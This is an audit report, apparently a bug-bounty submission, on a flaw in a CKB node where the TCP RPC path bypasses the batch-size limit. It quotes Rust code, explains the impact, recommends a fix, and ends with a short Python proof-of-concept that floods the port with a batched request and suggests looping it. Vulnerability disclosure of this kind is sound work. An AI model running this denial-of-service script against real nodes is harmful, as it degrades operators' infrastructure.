Audit Report

## Title
TCP RPC Server Bypasses `JSONRPC_BATCH_LIMIT`, Enabling Unbounded Batch Execution — (`rpc/src/server.rs`)

## Summary
The `JSONRPC_BATCH_LIMIT` guard is implemented exclusively inside the `handle_jsonrpc` HTTP handler in `rpc/src/server.rs`. The TCP server path calls `serve_stream_sink` directly, never routing through `handle_jsonrpc`, so the batch limit is silently bypassed for all TCP connections — even when `rpc_batch_limit` is explicitly configured by the operator. A single TCP connection can submit a 2 MB newline-terminated JSON batch containing thousands of `get_fee_rate_statistics` calls, each performing up to 202 synchronous RocksDB reads, saturating I/O and degrading block processing on the targeted node.

## Finding Description

**Root cause — two transport paths, one guard:**

`JSONRPC_BATCH_LIMIT` is a process-wide `OnceLock<usize>` initialized from `config.rpc_batch_limit`:

```rust
// rpc/src/server.rs L34, L53-55
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();
...
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
```

The check is enforced only inside `handle_jsonrpc` (the axum HTTP handler):

```rust
// rpc/src/server.rs L274-282
Request::Batch(calls) => {
    if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
        && calls.len() > *batch_size
    { return make_error_response(...); }
```

The TCP server path in `start_tcp_server` never calls `handle_jsonrpc`. It calls `serve_stream_sink` directly with the raw `MetaIoHandler`:

```rust
// rpc/src/server.rs L190-191
if let Err(err) = serve_stream_sink(&rpc, w, r, stream_config).await {
```

`serve_stream_sink` (from the external `jsonrpc_utils` crate) passes each decoded line directly to `MetaIoHandler`, which natively handles JSON-RPC batch arrays with no batch-size interception.

**Frame budget:**

The `LinesCodec` is configured with a 2 MB maximum frame length:

```rust
// rpc/src/server.rs L165
let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

A minimal `get_fee_rate_statistics` call is ~70 bytes, so a single 2 MB line can carry ~29,000 calls.

**Per-call DB cost:**

`FeeRateCollector::statistics` iterates up to `MAX_TARGET = 101` blocks, calling `get_block_hash` + `get_block_ext` per block:

```rust
// rpc/src/util/fee_rate.rs L8
const MAX_TARGET: u64 = 101;

// rpc/src/util/fee_rate.rs L56-59
fn get_block_ext_by_number(&self, number: BlockNumber) -> Option<BlockExt> {
    self.get_block_hash(number)
        .and_then(|hash| self.get_block_ext(&hash))
}
```

That is 2 synchronous RocksDB reads per block × 101 blocks = **202 reads per call**. A 200-call batch yields 40,400 synchronous RocksDB reads from a single TCP frame.

**`pipeline_size=4` does not mitigate this:** it limits concurrent *messages* (lines), not calls within a single batch message. One 2 MB line is one message; all its batch calls execute together inside that single message dispatch.

**`rpc_batch_limit` is `None` by default** (commented out in `resource/ckb.toml` L205-208). Even when an operator explicitly sets it, the TCP path ignores it entirely — confirmed by the test setup at `rpc/src/tests/setup.rs` L184 which sets `rpc_batch_limit: Some(1000)` but the TCP listener at L180 receives no such enforcement.

## Impact Explanation

A single TCP connection sending one newline-terminated 2 MB JSON batch saturates RocksDB I/O and the Tokio thread pool with tens of thousands of synchronous DB reads. Repeated connections amplify the effect. The node's ability to process and relay blocks is impaired, causing it to fall behind the chain tip. This matches the allowed CKB bounty impact: **High — Vulnerabilities which could easily crash a CKB node** (10001–15000 points). The attack is unauthenticated, requires no keys or PoW, and is trivially repeatable.

## Likelihood Explanation

TCP RPC is opt-in (`tcp_listen_address` is commented out by default in `resource/ckb.toml` L196) and defaults to `127.0.0.1:18114`. However, TCP is the *only* transport that supports the Subscription RPC module (documented in `util/app-config/src/configs/rpc.rs` L30-31: "Only TCP and WS are supported to subscribe events via the Subscription RPC module"). Mining pools and infrastructure operators who enable TCP for subscriptions and expose it on a non-loopback interface are directly vulnerable. No authentication is required once the port is reachable. The exploit requires only a TCP connection and a crafted JSON payload.

## Recommendation

Move the batch-limit check out of `handle_jsonrpc` and into a shared layer that applies uniformly to all transports. Concretely, wrap the TCP `serve_stream_sink` call with a pre-processing step that deserializes the incoming line, enforces `JSONRPC_BATCH_LIMIT`, and rejects oversized batches before dispatching to `MetaIoHandler`. Alternatively, implement the check inside a custom middleware on the `MetaIoHandler` dispatch path so HTTP, WS, and TCP all share the same enforcement point.

## Proof of Concept

```python
import socket, json

calls = [
    {"jsonrpc": "2.0", "method": "get_fee_rate_statistics", "params": [], "id": i}
    for i in range(200)
]
payload = json.dumps(calls) + "\n"

s = socket.create_connection(("127.0.0.1", 18114))
s.sendall(payload.encode())
# 200 calls × 202 RocksDB reads = 40,400 synchronous reads from one TCP frame.
# Loop to exhaust I/O budget and degrade block processing latency.
```

Prerequisites: node started with `tcp_listen_address = "0.0.0.0:18114"` (or any non-loopback address) in `ckb.toml`. No other configuration change is required. Even with `rpc_batch_limit = 200` set, the TCP path ignores it and executes all 200 calls.